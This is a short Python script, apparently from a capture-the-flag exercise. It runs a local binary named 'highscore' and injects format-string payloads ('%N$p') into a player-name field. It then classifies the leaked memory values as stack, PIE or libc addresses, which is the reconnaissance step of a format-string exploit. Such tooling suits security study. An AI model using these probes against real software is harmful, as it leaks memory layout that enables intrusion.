import subprocess
import sys

def get_val(i):
    input_str = f"1\n%{i}$p\n4\n"
    try:
        process = subprocess.Popen(['./highscore'], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        stdout, stderr = process.communicate(input=input_str)
        if "Player:" in stdout:
            val = stdout.split("Player:")[1].strip().split('\n')[0].strip()
            return val
    except:
        pass
    return "N/A"

if __name__ == "__main__":
    start = int(sys.argv[1])
    end = int(sys.argv[2])
    for i in range(start, end + 1):
        val = get_val(i)
        comment = ""
        if val.startswith("0x7ff"): comment = "STACK"
        elif val.startswith("0x55") or val.startswith("0x56"): comment = "PIE/TEXT"
        elif val.startswith("0x7f"): comment = "LIBC/MAPPED"
        elif val == "(nil)": val = "0x0"
        print(f"{i:<3} | {val:<18} | {comment}")
